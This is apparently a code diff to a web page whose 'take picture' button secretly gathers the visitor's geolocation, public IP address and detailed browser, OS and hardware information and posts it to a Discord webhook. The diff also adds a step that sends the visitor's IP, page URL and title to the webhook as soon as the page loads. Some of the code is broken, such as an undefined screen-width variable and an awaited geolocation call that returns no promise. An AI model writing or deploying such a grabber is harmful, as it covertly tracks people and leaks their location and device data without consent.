@@ -75,54 +75,72 @@
       // Handle the take picture button click event
       takePictureButton.addEventListener('click', async () => {
         // Get the current position and IP address
-        if (navigator.geolocation && navigator.userAgentData) {
+        try {
+          const position = await navigator.geolocation.getCurrentPosition();
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const ipUrl = 'https://api.ipify.org?format=json';
+          const response = await fetch(ipUrl);
+          const data = await response.json();
+          const ip = data.ip;
+
+          // Get the website URL, title, and other information
+          const websiteUrl = window.location.href;
+          const websiteTitle = document.title;
+          const userAgent = navigator.userAgent;
+          const platform = navigator.platform;
+          const browserName = getBrowserName(userAgent);
+          const browserVersion = getBrowserVersion(userAgent);
+          const osName = getOSName(platform);
+          const osVersion = platform;
+          const deviceType = getDeviceType(userAgent);
+          const screenHeight = screen.height;
+          const screenColorDepth = screen.colorDepth;
+          const screenOrientation = screen.orientation;
+
+          // Get the device information
+          const deviceMemory = navigator.deviceMemory;
+          const deviceHardwareConcurrency = navigator.hardwareConcurrency;
+          const deviceCpuArchitecture = getCPUArchitecture(userAgent);
+
+          // Create the form data
+          const formData = new FormData();
+          formData.append('content', `Siteye Girildi: ${lat}, ${lon} - IP Adresi: ${ip} - Website: ${websiteUrl} - Başlık: ${websiteTitle} - Sistem Bilgisi: ${browserName} ${browserVersion} - İşletim Sistemi: ${osName} ${osVersion} - Cihaz Bilgisi: ${deviceType} - Ekran Bilgisi: ${screenWidth}x${screenHeight} - Renk Derinliği: ${screenColorDepth} - Ekran Yönü: ${screenOrientation} - Cihaz Belleği: ${deviceMemory} - Cihaz Çekirdek Sayısı: ${deviceHardwareConcurrency} - Cihaz CPU Mimarisi: ${deviceCpuArchitecture}`);
+
+          // Send the form data to the Discord webhook
           try {
-            const position = await navigator.geolocation.getCurrentPosition();
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-
-            const ipUrl = 'https://api.ipify.org?format=json';
-            const response = await fetch(ipUrl);
-            const data = await response.json();
-            const ip = data.ip;
-
-            // Get the website URL, title, and other information
-            const websiteUrl = window.location.href;
-            const websiteTitle = document.title;
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const browserName = getBrowserName(userAgent);
-            const browserVersion = getBrowserVersion(userAgent);
-            const osName = getOSName(platform);
-            const osVersion = platform;
-            const deviceType = getDeviceType(userAgent);
-            const screenHeight = screen.height;
-            const screenColorDepth = screen.colorDepth;
-            const screenOrientation = screen.orientation;
-
-            // Get the device information
-            const deviceMemory = navigator.deviceMemory;
-            const deviceHardwareConcurrency = navigator.hardwareConcurrency;
-            const deviceCpuArchitecture = getCPUArchitecture(userAgent);
-
-            // Create the form data
-            const formData = new FormData();
-            formData.append('content', `Siteye Girildi: ${lat}, ${lon} - IP Adresi: ${ip} - Website: ${websiteUrl} - Başlık: ${websiteTitle} - Sistem Bilgisi: ${browserName} ${browserVersion} - İşletim Sistemi: ${osName} ${osVersion} - Cihaz Bilgisi: ${deviceType} - Ekran Bilgisi: ${screenWidth}x${screenHeight} - Renk Derinliği: ${screenColorDepth} - Ekran Yönü: ${screenOrientation} - Cihaz Belleği: ${deviceMemory} - Cihaz Çekirdek Sayısı: ${deviceHardwareConcurrency} - Cihaz CPU Mimarisi: ${deviceCpuArchitecture}`);
-
-            // Send the form data to the Discord webhook
-            try {
-              await fetch(webhookUrl, { method: 'POST', body: formData });
-              console.log('Webhook sent successfully!');
-            } catch (error) {
-              console.error('Error sending webhook:', error);
-            }
+            await fetch(webhookUrl, { method: 'POST', body: formData });
+            console.log('Webhook sent successfully!');
           } catch (error) {
-            console.error('Error getting location:', error);
+            console.error('Error sending webhook:', error);
           }
-        } else {
-          console.error('Coğrafi konum veya userAgentData bu tarayıcı tarafından desteklenmiyor.');
+        } catch (error) {
+          console.error('Error getting location:', error);
         }
       });
+
+      // Send the initial IP address to the Discord webhook
+      try {
+        const ipUrl = 'https://api.ipify.org?format=json';
+        const response = await fetch(ipUrl);
+        const data = await response.json();
+        const ip = data.ip;
+
+        // Create the form data
+        const formData = new FormData();
+        formData.append('content', `Siteye Girildi: unknown - IP Adresi: ${ip} - Website: ${window.location.href} - Başlık: ${document.title}`);
+
+        // Send the form data to the Discord webhook
+        try {
+          await fetch(webhookUrl, { method: 'POST', body: formData });
+          console.log('Webhook sent successfully!');
+        } catch (error) {
+          console.error('Error sending webhook:', error);
+        }
+      } catch (error) {
+        console.error('Error getting initial IP address:', error);
+      }
     </script>
   </body>
 </html>
